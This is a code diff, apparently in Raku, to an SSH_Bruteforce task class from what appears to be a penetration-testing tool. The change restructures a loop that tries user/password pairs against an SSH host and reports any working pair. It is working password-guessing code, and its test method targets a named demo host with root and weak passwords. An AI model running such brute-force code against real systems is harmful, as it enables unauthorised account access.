@@ -12,32 +12,31 @@ class SSH_Bruteforce extends Task {
     method _process(Str $target, Int $port, $users, $passw) {
         my ($cnt, $ssh2);
 
-        $ssh2 = Net::SSH2->new();
+        map {
+            my $user = $_;
 
-        if ($ssh2->connect($target, $port)) {
             map {
-                my $user = $_;
+                my $try = $_;
 
-                map {
-                    my $try = $_;
+                $ssh2 = Net::SSH2->new();
 
+                if ($ssh2->connect($target, $port)) {
                     $ssh2->auth_password($user, $try);
-                    my $ok = $ssh2->auth_ok();
 
-                    if ($ok) {
+                    if ($ssh2->auth_ok()) {
                         $self->_write_result("pair $user:$try is good for $target");
                         return;
                     }
 
                     $cnt++;
                     sleep(1);
-                } @$passw;
-            } @$users;
+                } else {
+                    $self->_write_result("Error: failed to connect to $target");
+                }
+            } @$passw;
+        } @$users;
 
-            $self->_write_result("tried $cnt user:pass combinations on $target, none succeeded...");
-        } else {
-            $self->_write_result("Error: failed to connect to $target");
-        }
+        $self->_write_result("tried $cnt user:pass combinations on $target, none succeeded...");
     }
 
     # Main function
@@ -51,7 +50,7 @@ class SSH_Bruteforce extends Task {
 
     # Test function
     method test {
-        $self->_process("alt.org", 22, ["root", "test"], ["123", "qwerty"]);
+        $self->_process("gtta.demo.stellarbit.com", 22, ["root", "test"], ["123", "qwerty"]);
     }
 }
 
